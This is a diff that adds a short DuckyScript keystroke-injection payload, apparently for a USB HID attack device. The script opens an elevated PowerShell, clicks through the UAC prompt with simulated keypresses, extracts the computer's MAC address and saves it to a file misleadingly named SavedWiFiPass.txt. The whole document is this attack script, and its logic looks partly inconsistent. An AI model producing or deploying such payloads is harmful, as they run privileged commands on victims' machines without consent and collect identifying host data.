@@ -1,0 +1,13 @@
+GUI r
+DELAY 500
+STRING powershell
+CTRL+SHIFT+ENTER
+DELAY 2000
+LEFTARROW
+DELAY 1000
+ENTER
+DELAY 500
+STRING $MAC = ipconfig /all | Select-String -Pattern "physical" | select-object -First 1; $MAC = [string]$MAC; $MAC = $MAC.Substring($MAC.Length - 17) >> $env:USERPROFILE\Downloads\SavedWiFiPass.txt
+ENTER
+STRING exit
+ENTER
